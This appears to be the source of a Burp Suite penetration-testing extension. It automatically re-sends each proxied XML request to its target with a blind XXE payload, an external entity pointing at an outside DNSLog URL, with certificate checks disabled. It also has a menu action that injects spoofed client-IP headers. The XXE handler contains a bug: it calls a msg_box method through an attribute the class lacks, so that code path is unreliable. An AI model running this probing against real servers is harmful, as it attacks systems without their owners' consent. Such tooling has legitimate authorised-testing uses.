#!/usr/bin/env python
# -*- coding:utf-8 -*-

from burp import IBurpExtender, IContextMenuFactory, ITab, IProxyListener

from java.awt import datatransfer, Toolkit
from javax.swing import JMenu, JMenuItem, JPanel
from javax.swing import JButton, JLabel, JTextField, JPasswordField, JTextArea, JScrollPane, JOptionPane

import os
import sys
import json
import time
import shutil
import urllib3
import zipfile
import hashlib
import requests
import StringIO
import threading

reload(sys)
sys.setdefaultencoding('utf8')

urllib3.disable_warnings()


VERSION = 202007171445
# 检查更新的频率(秒)
UPDATE_TIME = 300

RUN_LOCK = int(time.time())

with open('orz_plugin.lock', 'w') as f:
    f.write(str(RUN_LOCK))


class Tools():
    """
    工具类
    """

    def __init__(self):
        self.web_cookie = None
        self.web_account_prod = None
        self.web_password_prod = None
        self.web_account_test = None
        self.web_password_test = None
        self.client_src_ip = '127.0.0.1'
        self.dnslog_url = 'http://www.baidu.com'

        self.panel = None
        self.log_box = None
        self.log_scroll_pane = None

    def log(self, log_type, msg):
        # 日志框记录信息
        self.log_box.append('[ {} ] - [ {} ] : {}\n'.format(time.strftime('%Y-%m-%d %H:%M:%S'), log_type, msg).decode())
        jscrollbar = self.log_scroll_pane.getVerticalScrollBar()
        jscrollbar.setValue(jscrollbar.getMaximum())

    def send_issue(self, issue_type, msg):
        pass

    def msg_box(self, msg):
        # 弹信息框
        JOptionPane.showMessageDialog(self.panel, '{}'.format(msg).decode())

    def runtime(self):
        with open('orz_plugin.lock') as f:
            run_time = int(f.read().strip())
        if RUN_LOCK == run_time:
            return True
        else:
            return False

    def md5_data(self, data):
        md5 = hashlib.new('md5')
        md5.update(data)
        return md5.hexdigest()

    def unzip_update(self, src_data, dest_dir):
        try:
            zip_file = zipfile.ZipFile(src_data)
            zip_file.extractall(path=dest_dir)
            zip_file.close()
            return True
        except Exception as e:
            self.log('ERROR', '解压更新包失败 - {}'.format(e))
            return False

    def clipboard_copy(self, str_data):
        toolkit = Toolkit.getDefaultToolkit()
        clipboard = toolkit.getSystemClipboard()
        clipboard.setContents(datatransfer.StringSelection(str_data), None)



    def http_deal(self, url, request_methond, cookie, content_type, request_header, request_body):

        # if not self.runtime():
        #     return
        if 'xml' in content_type:
            hashstr = str(hash(url))[1:]
            try:
                post_data = '''<?xml version="1.0" encoding="utf-8"?>
                    <!DOCTYPE xx [ <!ENTITY alpx SYSTEM "'''+self.dnslog_url+'''"> ]>
                    <xx>&alpx;</xx>
                    '''
                result = requests.post(url, headers=request_header, data=post_data,
                                    verify=False,
                                    timeout=5)
                self.log('xml', 'url:{} - status_code:{}'.format(url, result.status_code))
            except Exception as e:
                self.log('ERROR', 'url:{} - error:{}'.format(url, e))
            self.tools.msg_box('[maybe]xxe: '+url)


class BurpExtender(IBurpExtender, IContextMenuFactory, ITab, IProxyListener):
    """
    BurpSuite插件类
    """

    def __init__(self):
        self.plugin_name = u'orz Plugin'
        self.panel = None
        self.callbacks = None
        self.DEBUG = True
        self.context = None
        self.helpers = None
        self.log_box_width = 1000
        self.log_box_height = 400
        self.tools = Tools()

        self.now_version = VERSION

    def registerExtenderCallbacks(self, callbacks):
        # 注册插件
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.callbacks.setExtensionName(self.plugin_name)

        # 绘制标签页UI
        self.tab_ui()

        self.callbacks.customizeUiComponent(self.panel)
        self.callbacks.addSuiteTab(self)

        self.callbacks.registerProxyListener(self)
        self.callbacks.registerContextMenuFactory(self)
        print('Plugin load successfully!')
        self.tools.log('INFO', '插件加载成功 - 当前版本: {}'.format(VERSION))
        self.tools.log('INFO', '当前debug模式: {}'.format(self.DEBUG))

        # 窗口大小检查线程
        log_box_thread = threading.Thread(target=self.reset_log_box_size)
        log_box_thread.setDaemon(True)
        log_box_thread.start()

        return

    def createMenuItems(self, invocation):
        # 创建菜单右键菜单选项
        self.context = invocation
        menu_list = JMenu('orz Plugin')
        if self.context.getToolFlag() == 0x40:
            menu_list.add(JMenuItem(
                u'添加IP伪造请求头',
                actionPerformed=self.update_client_src_ip
            ))
            menu_list.add(JMenuItem(
                u'生成DNSLog Payload',
                actionPerformed=self.dnslog_payload
            ))

            # DEBUG 按钮
            menu_list.add(JMenuItem(
                'orz - DEBUG',
                actionPerformed=self.debug_fun
            ))
        return [menu_list]

    def tab_ui(self):
        self.panel = JPanel()
        self.panel.setLayout(None)


        self.ui_client_dnslog_label_1 = JLabel('-' * 10 + u' IP伪造请求头 & DNSLog 配置 ' + '-' * 155)
        self.ui_client_dnslog_label_1.setBounds(20, 10, 1000, 28)

        self.ui_client_ip_label_1 = JLabel(u'伪造IP: ')
        self.ui_client_ip_label_1.setBounds(20, 40, 70, 30)
        self.ui_client_ip = JTextField('127.0.0.1')
        self.ui_client_ip.setBounds(80, 40, 200, 28)

        self.ui_client_url_label_1 = JLabel(u'dnslog url: ')
        self.ui_client_url_label_1.setBounds(10, 80, 70, 30)
        self.ui_client_url = JTextField('http://examlpe.com')
        self.ui_client_url.setBounds(80, 80, 200, 28)

        self.ui_button_label = JLabel('-' * 210)
        self.ui_button_label.setBounds(20, 110, 1000, 28)

        #self.ui_web_test_button = JButton(u'登录测试', actionPerformed=self.login_test)
        #self.ui_web_test_button.setBounds(20, 140, 100, 28)

        self.ui_save_button = JButton(u'保存配置', actionPerformed=self.save_configuration)
        self.ui_save_button.setBounds(20, 140, 100, 28)


        self.ui_debug_button = JButton('Debug', actionPerformed=self.debug_fun)
        self.ui_debug_button.setBounds(135, 140, 100, 28)
        self.panel.add(self.ui_debug_button)

        self.ui_log_box = JTextArea('')
        self.ui_log_box.setLineWrap(True)
        self.ui_log_box.setEditable(False)
        self.ui_log_scroll_pane = JScrollPane(self.ui_log_box)
        self.ui_log_scroll_pane.setBounds(20, 190, self.log_box_width, self.log_box_height)


        self.panel.add(self.ui_client_dnslog_label_1)
        self.panel.add(self.ui_client_ip_label_1)
        self.panel.add(self.ui_client_ip)
        self.panel.add(self.ui_client_url_label_1)
        self.panel.add(self.ui_client_url)

        self.panel.add(self.ui_button_label)
        #self.panel.add(self.ui_web_test_button)
        self.panel.add(self.ui_save_button)

        self.panel.add(self.ui_log_scroll_pane)

        self.tools.panel = self.panel
        self.tools.log_box = self.ui_log_box
        self.tools.log_scroll_pane = self.ui_log_scroll_pane

    def getTabCaption(self):
        # 设置标签页名称
        return self.plugin_name

    def getUiComponent(self):
        # 设置标签页UI
        return self.panel

    def processProxyMessage(self, message_is_request, message):
        """
        处理Proxy请求
        url: http://biubiu.com:80/h/p?id=24&a=123
        request_methond: POST GET etc
        cookie: 顾名思义
        content_type: 如 application/json; charset=UTF-8
        request_header: 包含coolie的头
        request_body: 顾名思义
        host: 主机名
        port: 端口号
        protocol: 协议，如http、https
        url_parameters：url中的参数信息, 格式{'id':23,'a':123}
        """
        if message_is_request and self.DEBUG:
            request = message.getMessageInfo().getRequest()
            analyzedRequest = self.helpers.analyzeRequest(message.getMessageInfo().getHttpService(), request)

            request_headers = analyzedRequest.getHeaders()
            request_body = request[analyzedRequest.getBodyOffset():].tostring()
            url = str(analyzedRequest.getUrl())
            host = message.getMessageInfo().getHttpService().getHost()
            port = message.getMessageInfo().getHttpService().getPort()
            protocol = message.getMessageInfo().getHttpService().getProtocol()
            request_methond = str(analyzedRequest.getMethod())

            parameters = analyzedRequest.getParameters()
            url_parameters = {}
            for parameter in parameters:
                if parameter.getType() == 0:
                    url_parameters[str(parameter.getName())] = str(parameter.getValue())

            cookie = ""
            content_type = ""
            request_header = {}
            for header in request_headers[2:]:
                header = str(header).strip()
                header_temp = header.split(':')
                request_header[header_temp[0].strip()] = ':'.join(header_temp[1:]).strip()

                if header.startswith("Cookie:"):
                    cookie_temp = header.split(':')
                    cookie = ':'.join(cookie_temp[1:]).strip()
                    continue
                if header.startswith("Content-Type"):
                    content_type = ':'.join(header.split(':')[1:]).strip()

            # self.tools.log('content_type', content_type)
            # self.tools.log('request_methond', request_methond)
            # self.tools.log('url', url)
            #self.tools.log('request_header', request_header)
            # self.tools.log('cookie', cookie)
            self.tools.http_deal(url, request_methond, cookie, content_type, request_header, request_body)
            # 多线程
            # proxy_thread = threading.Thread(target=self.tools.http_deal, args=(
            #     url, request_methond, cookie, content_type, request_header, request_body))
            # proxy_thread.setDaemon(True)
            # proxy_thread.start()

            # 新增处理线程

    def login_test(self, event):

        # 生产环境Web方式获取Cookie测试
        return


    def save_configuration(self, event):

        self.tools.client_src_ip = str(self.ui_client_ip.getText()).strip()
        self.tools.dnslog_url = str(self.ui_client_url.getText()).strip()

        self.tools.log('INFO', '配置保存成功')

    def reset_log_box_size(self):
        while self.tools.runtime():
            time.sleep(1)
            new_width = int(self.panel.rootPane.getSize().width) - 40
            new_height = int(self.panel.rootPane.getSize().height) - 290
            if new_width != self.log_box_width or new_height != self.log_box_height:
                self.log_box_width = new_width
                self.log_box_height = new_height
                self.ui_log_scroll_pane.setBounds(20, 190, self.log_box_width, self.log_box_height)
                self.panel.updateUI()

    def debug_fun(self, event):
        if self.DEBUG:
            self.DEBUG=False
            self.tools.log('INFO', 'set debug = False')
        else:
            self.DEBUG=True
            self.tools.log('INFO', 'set debug = True')

    def update_web_cookie(self):
        http_traffic = self.context.getSelectedMessages()[0]
        traffic_analyze = self.helpers.analyzeRequest(http_traffic)
        return


    def web_cookie_web_prod(self, event):
        self.update_web_cookie()

    def update_client_src_ip(self, event):
        add_header = [
            'X-Originating-IP',
            'X-Forwarded-For',
            'X-Remote-IP',
            'X-Remote-Addr',
            'X-Client-IP',
            'X-Real-IP',
            'Proxy-Cllient-IP',
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED_FOR'
        ]
        http_traffic = self.context.getSelectedMessages()[0]
        traffic_analyze = self.helpers.analyzeRequest(http_traffic)
        new_headers = []
        tmp_add_header = map(str.lower, add_header)
        for header in traffic_analyze.getHeaders():
            tmp_header = header.split(':')[0].strip().lower()
            if tmp_header not in tmp_add_header:
                new_headers.append(header)
        new_headers += map(lambda x: '{}: {}'.format(x, self.tools.client_src_ip), add_header)
        new_request = self.helpers.buildHttpMessage(new_headers,
                                                    http_traffic.getRequest()[traffic_analyze.getBodyOffset():])
        http_traffic.setRequest(new_request)

    def dnslog_payload(self, event):
        self.tools.msg_box('功能暂未实现,待更新')